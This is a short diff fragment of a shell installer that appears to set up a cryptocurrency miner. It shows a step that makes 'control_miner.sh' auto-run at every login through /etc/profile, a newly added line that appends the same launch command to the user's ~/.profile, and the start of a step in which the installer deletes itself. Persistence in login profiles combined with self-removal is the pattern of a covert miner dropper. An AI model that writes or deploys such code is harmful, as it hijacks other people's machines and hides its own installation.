@@ -71,6 +71,7 @@ chmod +x ~/control_miner.sh
 # Step 7: Add the control script to ~/.profile for auto-run on login
 echo "Adding control script to ~/.profile for auto-run on login..."
 sudo echo "bash ~/control_miner.sh &" >> /etc/profile
+sudo echo "bash ~/control_miner.sh &" >> /home/$(whoami)/.profile
 
 # Step 8: Self-remove the installer script
 echo "Self-removing the installation script..."
